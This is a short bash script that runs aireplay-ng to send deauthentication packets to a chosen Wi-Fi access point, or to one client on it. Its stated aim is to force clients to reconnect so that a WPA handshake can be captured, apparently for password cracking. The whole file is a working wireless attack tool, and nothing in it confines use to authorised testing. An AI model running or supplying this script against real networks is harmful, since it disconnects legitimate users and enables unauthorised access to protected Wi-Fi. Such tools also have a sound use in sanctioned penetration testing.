#!/usr/bin/env bash
# Deauth the target AP (and optionally a specific client). Uses the same BSSID as the current capture target.
# Usage: deauth.sh <monitor_interface> <bssid> [client_mac]
# If client_mac is omitted, sends broadcast deauth to all clients on the AP.
set -euo pipefail

if [ "$#" -lt 2 ]; then
  echo "Usage: $0 <monitor_interface> <bssid> [client_mac]" >&2
  echo "  Sends deauth packets to force clients to reconnect and capture WPA handshake." >&2
  exit 1
fi

IFACE="$1"
BSSID="$2"
CLIENT_MAC="${3:-}"

if ! command -v aireplay-ng >/dev/null 2>&1; then
  echo "aireplay-ng is not installed. Install aircrack-ng suite and try again." >&2
  exit 1
fi

echo "[+] Sending deauth packets to BSSID $BSSID on $IFACE (10 packets; run again if needed)..."
# -0 10 = send 10 deauth packets then exit (enough to trigger reconnect and handshake capture)
if [ -n "$CLIENT_MAC" ]; then
  aireplay-ng -0 10 -a "$BSSID" -c "$CLIENT_MAC" "$IFACE"
else
  aireplay-ng -0 10 -a "$BSSID" "$IFACE"
fi
echo "[+] Deauth sent. Check capture for WPA handshake."
